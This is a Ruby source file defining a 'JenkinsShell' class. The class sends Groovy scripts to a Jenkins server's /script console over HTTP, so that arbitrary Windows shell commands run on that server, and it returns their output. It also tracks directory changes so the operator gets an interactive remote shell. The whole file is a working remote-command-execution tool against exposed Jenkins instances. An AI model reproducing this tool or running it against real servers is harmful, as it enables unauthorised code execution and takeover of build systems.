require "net/http"
require "rexml/document"
require "uri"

class JenkinsShell
    attr_reader :cwd
    attr_reader :host
    attr_reader :port

    def cd(dir = nil)
        return true if (dir.nil? || dir.empty?)

        new_cwd = pwd("#{@int_cwd}/#{dir}")

        return false if (new_cwd.empty? || (new_cwd == @cwd))

        @cwd = new_cwd
        @int_cwd = "#{@int_cwd}/#{dir}".gsub(%r{[^/]+/\.\.}, "")

        return true
    end

    def command(cmd, dir = @int_cwd)
        # Create and encode Groovy script
        fix = dir.gsub(/\\/, "\\\\\\")
        gs = "println(\"cmd /c cd #{fix} && #{cmd}\".execute().text)"
        enc = URI::encode(URI::encode(gs), "&()/").gsub("%20", "+")

        # Establish connection and send script
        http = Net::HTTP.new(@host, @port)
        xml = REXML::Document.new(
            http.post("/script", "script=#{enc}").body
        )

        # Parse response and return script output
        return xml.get_elements("html/body/div/div/pre")[1].text
    end

    def initialize(host, port = 8080)
        @int_cwd = "."
        @host = host.gsub(/^https?:\/\/|(:[0-9]+)?\/.+/, "")
        @port = port
        @cwd = pwd
    end

    def pwd(dir = @int_cwd)
        command("dir", dir).match(/^\s+Directory of (.+)/) do |m|
            return m[1]
        end
        return ""
    end
end
